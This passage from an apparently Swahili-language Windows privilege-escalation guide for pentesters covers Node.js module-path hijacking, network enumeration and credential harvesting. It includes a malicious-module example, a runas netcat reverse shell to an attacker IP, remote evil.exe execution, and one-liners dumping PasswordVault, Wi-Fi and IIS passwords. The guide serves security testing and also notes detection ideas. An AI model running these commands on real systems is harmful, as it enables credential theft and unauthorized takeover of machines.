for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji nyara wa utatuzi wa module za Node.js / Electron kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapofanya import isiyo na njia kamili kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta package kwa kupanda kwenye mti wa saraka na kuangalia folda za `node_modules` katika kila saraka ya mzazi. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa kiendeshi, kwa hiyo programu inayoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta katika:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye mapendeleo ya chini** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye mapendeleo ya juu** ujaribu kutatua utegemezi unaokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato lengwa, kwa hiyo hali hii huwa **LPE** wakati lengwa linaendeshwa kama msimamizi, kutoka kwenye scheduled task/wrapper ya service iliyo na mapendeleo yaliyoinuliwa, au kutoka kwenye programu ya desktop yenye mapendeleo inayojiwasha kiotomatiki.

Hali hii hutokea hasa wakati:

- utegemezi umetajwa katika `optionalDependencies`<sup>[[22]](#references)</sup>
- library ya mtu wa tatu inaweka `require("foo")` ndani ya `try/catch` na kuendelea endapo itashindwa
- package iliondolewa kwenye build za production, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- `require()` iliyo hatarini iko ndani zaidi kwenye mti wa utegemezi badala ya kuwa kwenye msimbo mkuu wa programu

### Kutafuta malengo yaliyo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable lengwa (`node.exe`, EXE ya programu ya Electron, au mchakato wa wrapper)
- Chuja kwa `Path` `contains` `node_modules`
- Lenga matokeo ya `NAME NOT FOUND` na ufunguzi wa mwisho uliofanikiwa chini ya `C:\node_modules`

Mifumo muhimu ya kutafuta unapokagua msimbo katika faili za `.asar` zilizofunguliwa au vyanzo vya programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la kifurushi kinachokosekana** kupitia Procmon au ukaguzi wa chanzo.
2. Unda saraka ya msingi ya lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Washa application ya mwathiriwa. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano halisi ya module za hiari zinazokosekana zinazolingana na muundo huu ni `bluebird` na `utf-8-validate`, lakini **mbinu** ndiyo inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo mchakato wa Windows Node/Electron wenye privileges za juu utaresolvi.

### Mawazo ya ugunduzi na uimarishaji

- Toa alert mtumiaji anapounda `C:\node_modules` au kuandika faili/package mpya za `.js` humo.
- Tafuta michakato yenye integrity ya juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya third-party ili kutafuta miundo ya `try { require("...") } catch {}` inayoshindwa kimyakimya.
- Zima ukaguzi wa hiari pale library inapounga mkono hilo (kwa mfano, baadhi ya deployment za `ws` zinaweza kuepuka ukaguzi wa zamani wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Rasilimali zilizoshirikiwa

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Angalia kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye faili la hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Milango Iliyofunguliwa

Kagua **huduma zilizozuiwa** kutoka nje.

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote-control inaweza kutoa access kama desktop user yake tu ikiwa authentication na vidhibiti vya amri vinaruhusu. Custom TCP application inayoendeshwa na akaunti yenye privileges za juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni vidokezo visivyoingilia mfumo, ilhali njia ya memory-corruption inayohitaji authentication inahitaji uchanganuzi wa binary hiyo mahususi na input inayoweza kufikiwa nayo. Ikiwa port iliyo wazi inaonekana kuwa ya system process, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubainisha backend service; forwarding rule peke yake haithibitishi kwamba destination inafikika au ina udhaifu.

### Jedwali la Routing

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

[Amri zaidi za kuorodhesha mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana kwenye `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, GUI itakuuliza ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kwa urahisi kama root, unaweza kujaribu `--default-user root`

Unaweza kuchunguza filesystem ya `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa root ya Linux ndani ya WSL pekee hakukupi haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma filesystem ya distribution, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) kwa amri ambazo huenda zilirekodi credentials; escalation bado inahitaji akaunti halali yenye kiwango cha juu cha ruhusa na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` unatumika kwa usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi distribution kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hiyo tambua kwanza distribution na njia halisi ya hifadhi. Epuka kuchapisha maudhui ya historia wakati wa enumeraton ya kiotomatiki.

## Windows Credentials

### Winlogon Credentials

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si kama credentials. Thamani ya `DefaultPassword` au `AltDefaultPassword` isiyo tupu ni ugunduzi wa plaintext kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna password ya plaintext inayosomeka, huo ni kidokezo tu: [Sysinternals Autologon inaweza kuhifadhi password kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na usomaji wa kawaida wa registry hauwezi kuthibitisha kama secret hiyo ipo au inaweza kurejeshwa. Kagua haki za ufikiaji na usanidi halisi wa kuingia kabla ya kuripoti ufichuaji wa credentials.

### Credentials manager / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji za seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuingiza watumiaji kiotomatiki**. Mwanzoni, inaweza kuonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na kufanya vivinjari viingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki. Hii inamaanisha kwamba **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault, na kutumia credentials zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na password kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali fulani. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` kwa seti ya credentials iliyotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kuwa unaweza kutumia mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au moduli ya [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na password za maandishi wazi ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (ambayo pia huonekana kama `Web Credentials` katika `vaultcmd`). Hifadhi hii imetenganishwa kulingana na session na inaweza kufanyiwa decrypt kwa kutumia uwezo wa asili bila haki za kiutawala au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session amilifu ya mtumiaji ili kufanya dump na decrypt papo hapo ya majina yote ya watumiaji na password zote zilizohifadhiwa za maandishi wazi:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya kusimba data kwa kutumia ufunguo linganifu, na hutumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kusimba funguo za faragha zisizolingana kwa kutumia ufunguo linganifu. Usimbaji huu hutumia siri ya mtumiaji au ya mfumo ili kuongeza kwa kiasi kikubwa entropy.

**DPAPI huwezesha usimbaji wa funguo kupitia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa domain za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Ufunguo wa DPAPI, ulio pamoja na master key inayolinda funguo za faragha za mtumiaji kwenye faili hiyo hiyo**, kwa kawaida huwa na baiti 64 za data nasibu. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na arguments zinazofaa (`/pvk` au `/rpc`) ili kuidecrypt.

**credentials files zinazolindwa na master password** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kusimbua.\
Unaweza **kutoa masterkeys nyingi za DPAPI** kutoka **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** hutumiwa mara nyingi kwa **scripting** na kazi za automation kama njia rahisi ya kuhifadhi credentials zilizosimbwa. Credentials hizi hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kuwa zinaweza kusimbuliwa na mtumiaji yuleyule tu kwenye kompyuta ileile zilipoundwa.

Credential iliyohamishwa inaweza kuwa na jina lolote la faili au njia ya `.xml`. Ikiwa script au orodha ya faili inaelekeza kwenye mojawapo, tafuta saraka halisi ya profile ya akaunti badala ya kudhani kuwa ni `C:\Users`: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima iwe na ruhusa halali tofauti kwenye service inayolengwa. Kagua njia na ACLs kwanza, bila kuonyesha thamani zilizosimbwa au maandishi wazi wakati wa ukaguzi wa kawaida.

Ili **kusimbua** PS credentials kutoka kwenye faili inayozihifadhi, unaweza kufanya yafuatayo:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho vya Eneo-kazi la Mbali**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya connections.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na kwenye Documents za mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya connection na attributes za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kama kidokezo cha credential. Thamani iliyohifadhiwa si password ya DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji fiche ya faili na kama custom master password ilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa enumeration pana.

**Profile exports za Remote Desktop Plus** zinaweza pia kusomeka kwenye directories za watumiaji au folda ya pamoja ya usimamizi. Legacy `profiles.xml` export ina entries za `Data/Profile` zenye elements za `ProfileName`, `Password`, na `Secure`. Chukulia element ya password isiyo tupu kama kidokezo cha credential, bila kuichapisha au kudhani kuwa iko katika plaintext: [maelezo ya vendor](https://www.donkz.nl/) yanasema kuwa ulinzi wa profile unaweza kuhusishwa na account na computer iliyoiunda, au kuwekwa bila ukali mkubwa. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Watu wakati mwingine huhifadhi passwords na taarifa nyingine kwenye programu za sticky-note. Programu ya Sticky Notes ya Microsoft inayosambazwa kama package kwa kawaida huhifadhi notes kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine za user-profile, ikijumuisha LevelDB. Tambua programu iliyosakinishwa na muundo wa hifadhi kabla ya kuchukulia kutokuwepo kwa faili ya SQLite kuwa hakuna notes.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa notes zilizofanyiwa commit hivi karibuni. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya database, na ujumuishe `plum.sqlite-shm` ikiwa inapatikana; index ya shared-memory inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya database. Tazama [nyaraka za WAL za SQLite](https://www.sqlite.org/wal.html). Note iliyo na jina la account au password ni kidokezo cha credential pekee: thibitisha account, ruhusa za access, na matumizi tena ya password kando. Rekodi iliyosimbwa ya password manager pia inahitaji decryption key yake halisi na tafsiri inayohusu programu husika kabla ya kuthibitisha login yenye privilage za juu.

### AppCmd.exe

**Kumbuka kwamba ili kurejesha passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha chini ya kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye directory ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, huenda baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Code hii ilitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
**Installers huendeshwa kwa SYSTEM privileges**, nyingi ziko hatarini kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (Credentials)

### Support-tool registry credential artifacts

Baadhi ya usakinishaji wa zamani wa zana za usaidizi wa mbali huhifadhi majina ya thamani yanayohusiana na nywila chini ya funguo maalum za registry za programu. Kwa mfano, kulingana na [maelezo ya vendor kuhusu funguo za registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` ya TeamViewer ilitambulisha nywila tuli ya kipindi iliyosanidiwa katika matoleo ya kabla ya 9. Kiashiria cha jina la thamani ni kidokezo cha ukaguzi tu: thibitisha toleo lililosakinishwa, data ya thamani inayoweza kusomwa, umbizo na tabia ya sasa ya uthibitishaji kabla ya kutathmini kitambulisho hicho. Kuhama kutoka nywila ya usaidizi wa mbali hadi akaunti ya Windows yenye ruhusa za juu zaidi kunahitaji pia matumizi halisi ya nywila hiyo tena na idhini ya kutumia akaunti hiyo. Usijumuishe maandishi fiche au nywila zilizorejeshwa kwenye matokeo ya kawaida ya uorodheshaji.

### Lahajedwali zilizoshirikiwa zenye laha zilizolindwa

Ikiwa inashukiwa kuwa kitabu cha kazi kinachoshirikiwa na kinachoweza kusomwa kina data ya akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa laha ya kazi au safu wima zilizofichwa. [Microsoft inasema](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa laha ya kazi hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa yaliyomo kwenye kitabu cha kazi yamesimbwa kwa njia fiche. Kagua faili husika tu ambazo unaidhini ya kuzifikia, na epuka kuchapisha siri zinazoweza kuwapo wakati wa uorodheshaji mpana. Njia ya `.xlsx` inayosomeka, laha iliyolindwa, au safu wima iliyofichwa pekee havithibitishi kuwa vitambulisho vipo au kwamba akaunti yoyote ina ruhusa za juu zaidi; thibitisha data halisi na ruhusa za sasa za akaunti kando.

### Viraka vya mabadiliko vilivyohifadhiwa na seva ya CI

Seva ya CI inaweza kuhifadhi mabadiliko ya msimbo yaliyowasilishwa kwenye saraka yake ya data hata baada ya build kukamilika. [TeamCity inaeleza](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` hutumika kuhifadhi mabadiliko ya remote-run; saraka ya data inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Kiraka kinachosomeka kinaweza kuhifadhi marejeo yaliyoondolewa au kuongezwa ya faili ya kitambulisho, ufunguo wa usimbaji fiche, au hati inayotumia vyote viwili. Kwa mfano, mtiririko wa kazi wa PowerShell wa `ConvertTo-SecureString -Key` unahitaji ufunguo wa AES pamoja na mfuatano uliosimbwa kwa njia fiche; [Microsoft inaeleza](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa ufunguo hutolewa kando. Kagua kwanza majina ya viraka vinavyoweza kufikiwa, kisha kagua yaliyomo husika ukiwa na idhini na bila kuchapisha siri kwenye matokeo ya kawaida ya uorodheshaji. Njia ya kiraka, thamani iliyosimbwa kwa njia fiche, au rejeleo la ufunguo pekee havithibitishi kuwa kuna kitambulisho halali au ufikiaji wenye ruhusa za juu zaidi. Zuia ruhusa za ACL za saraka ya data na epuka kuweka siri kwenye mabadiliko ya build.

### Mzunguko maalum wa nywila za msimamizi wa ndani

Kibadilishaji cha nywila kilichotengenezwa kienyeji kinaweza kuhifadhi nywila ya msimamizi wa ndani iliyosimbwa kwa njia fiche katika huduma ya ndani huku kikiweka vitambulisho vya datastore kwenye faili ya `.env` inayosomeka au karibu na binary ya kisasishaji. Kagua kwa pamoja scheduled task ya kisasishaji, akaunti, ACL za usanidi, listener na ruhusa za datastore. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani aliye na vitambulisho halali, lakini uthibitishaji pekee hauthibitishi ruhusa ya kusoma rekodi husika. Ikiwa seed ya usimbaji fiche au nyenzo za ufunguo zinapatikana karibu na maandishi fiche, kagua mchakato halisi wa uundaji wa ufunguo kabla ya kuamini usimbaji huo. Mbinu inayounda ufunguo wa AES kwa njia isiyobadilika kutoka kwa seed iliyo wazi kwa kutumia Go's [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda nywila hiyo; Go inaeleza kuwa kifurushi hicho hakifai kwa uzalishaji wa nambari nasibu unaohitaji usalama. Thibitisha kuwa nywila yoyote iliyorejeshwa bado ni halali na ni ya akaunti iliyo kwenye kikundi cha Administrators cha ndani kabla ya kuichukulia kama njia ya kuongeza ruhusa. Scheduled task, njia ya `.env`, au blob iliyosimbwa kwa njia fiche pekee havithibitishi masharti hayo. Usijumuishe nywila na nyenzo za ufunguo kwenye matokeo ya kawaida ya uorodheshaji.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kudhibiti nywila za wasimamizi wa ndani. Hifadhi yake inayotegemea directory au Entra pamoja na vidhibiti vya ufikiaji ni tofauti na datastore maalum ya ndani; vivyo hivyo, [majukumu ya Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji wa datastore aliyethibitishwa anaweza kusoma faharasa maalum.

### Kumbukumbu za plugin za seva ya Java na matumizi tena ya vitambulisho

Baadhi ya plugin za seva za Java husambazwa kama kumbukumbu za JAR kwenye saraka ya `plugins` ya seva. Plugin maalum inayosomeka inaweza kuwa na usanidi au bytecode yenye kitambulisho cha huduma kilichopachikwa. Kagua kumbukumbu hiyo tu ukiwa na idhini, na usijumuishe siri zilizorejeshwa kwenye matokeo ya kawaida ya uorodheshaji. Njia ya plugin pekee haithibitishi kuwa siri ipo, na nywila ya huduma iliyorejeshwa husababisha ruhusa za juu zaidi tu ikiwa pia ni halali kwa akaunti yenye ruhusa za juu zaidi. Kagua ACL za faili husika na ubadilishe vitambulisho vilivyotumiwa tena kwa siri tofauti. Tazama [mwongozo wa usakinishaji wa plugin wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kwa mpangilio wa saraka na [hati za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa yaliyomo kwenye kumbukumbu.

### Vitambulisho vya hifadhidata iliyopachikwa ya Openfire

